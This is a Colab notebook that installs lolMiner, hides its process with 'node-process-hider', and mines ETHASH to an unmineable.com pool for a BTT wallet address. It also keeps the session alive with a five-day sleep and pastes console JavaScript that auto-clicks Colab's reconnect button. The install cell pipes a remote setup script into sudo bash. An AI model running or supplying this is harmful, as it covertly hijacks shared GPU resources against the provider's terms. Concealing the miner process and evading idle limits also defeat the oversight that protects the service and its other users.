{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled0.ipynb",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/madkobs1242/BTT/blob/main/BTT-NO-SSH.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Check GPU**\n",
        "!nvidia-smi"
      ],
      "metadata": {
        "cellView": "form",
        "id": "Un_OWtHjYxbV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **install**\n",
        "!curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add lolMiner && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar -xf lolMiner_v1.42_Lin64.tar.gz && apt install screen"
      ],
      "metadata": {
        "cellView": "form",
        "id": "HePjQSlvZdma"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Run**\n",
        "!screen 1.42/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TUtN9A2hvXyjqj8ysSZtan8yeXtxtw8sjU.BTT1"
      ],
      "metadata": {
        "cellView": "form",
        "id": "YKiFlJu6ZuBy"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Make Alive** \n",
        " \n",
        "alive = True #@param {type:'boolean'}\n",
        " \n",
        "! sleep 432000"
      ],
      "metadata": {
        "cellView": "form",
        "id": "ljeeT7vJePi0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Auto Reconnect**\n",
        "\n",
        "Press F12 >>> Select Console>>> Paste this code\n",
        "```\n",
        "function ClickConnect() {\n",
        "  console.log('Working')\n",
        "  document\n",
        "    .querySelector('#top-toolbar > colab-connect-button')\n",
        "    .shadowRoot.querySelector('#connect')\n",
        "    .click()\n",
        "}\n",
        "\n",
        "setInterval(ClickConnect, 60000)\n",
        "\n"
      ],
      "metadata": {
        "id": "33NgarcNeVuT"
      }
    }
  ]
}